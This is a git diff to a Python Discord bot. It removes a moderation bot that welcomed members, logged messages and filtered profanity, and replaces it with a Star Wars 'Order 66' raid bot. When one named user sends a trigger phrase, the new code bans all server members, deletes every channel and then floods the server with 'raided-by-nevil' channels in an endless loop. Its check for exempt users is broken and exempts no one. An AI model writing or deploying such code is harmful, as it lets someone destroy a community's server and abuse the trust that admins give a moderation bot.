@@ -1,39 +1,55 @@
-# Python discord Bot named of nevil | Aims to provide moderation services. | Version 1.00
+# A bot that recreates the events that occurred during Order 66 in the show star wars within a discord server.
 
-import time
+
 import discord
-import better_profanity
+import multiprocessing
 
-def main():
-    class Nevil(discord.Client, discord.Guild):
-        async def on_member_join(self, member):
-            channels = []
-            member_join = f"Welcome to the server {member.mention}"
-            welcome_channel = self.get_channel(1247449934257721367)
-            await welcome_channel.send(content=member_join, mention_author=True)
-            await member.add_roles(discord.Object(1247824978552950804), atomic=True)
+USERNAME = "snheakydoge"
+ORDER = "Execute order 66"
 
-        async def on_ready(self):
-            print("BOT: {} is Online.".format(self.user))
-            await self.create_text_channel(name="test")
-
+def removeUsers():
+    class AttackOnTheJedi(discord.Client):
         async def on_message(self, message):
-            if message.author == self.user:
-                pass
-            else:
-                user_logs = ("{}: {}: {}".format(time.strftime("%H:%M:%S"), message.author, message.content))
-                print(user_logs)
-                with open("logs.txt", "a") as log:
-                    log.write("{}\n".format(user_logs))
-
-            if better_profanity.profanity.contains_profanity(message.content) is True:
-                await message.delete()
-                await message.author.send("You cannot say this word here. ")
+            if str(message.author) == USERNAME:
+                if message.content == ORDER:
+                    for user in self.get_all_members():
+                        if user != ("Nevil#3721", "snheakydoge"):
+                            await user.ban()
 
     permissions = discord.Intents.all()
-    main_call = Nevil(intents=permissions)
-    main_call.run("enter token here")
+    execute_jedi = AttackOnTheJedi(intents=permissions)
+    execute_jedi.run("ENTER BOT TOKEN")
+
+def main():
+    class Order(discord.Client):
+        async def on_ready(self):
+            print("Clones standing by... ")
+
+        async def on_message(self, message):
+            if str(message.author) == USERNAME:
+                if message.content == ORDER:
+                    print("\nYes sir. ")
+                    for channels in self.get_all_channels():
+                        await channels.delete()
+
+                    guild = self.get_guild(1245613952373624832)
+                    while True:
+                        await guild.create_text_channel("raided-by-nevil")
+                        if message.content == "break":
+                            break
+
+    permissions = discord.Intents.all()
+    PalpatinesOrder = Order(intents=permissions)
+    PalpatinesOrder.run("ENTER BOT TOKEN")
+
 
 
 if __name__ == "__main__":
-    main()
+    t1 = multiprocessing.Process(target=main)
+    t2 = multiprocessing.Process(target=removeUsers)
+
+    processes = [t1, t2]
+    for start in processes:
+        start.start()
+    for join in processes:
+        join.join()
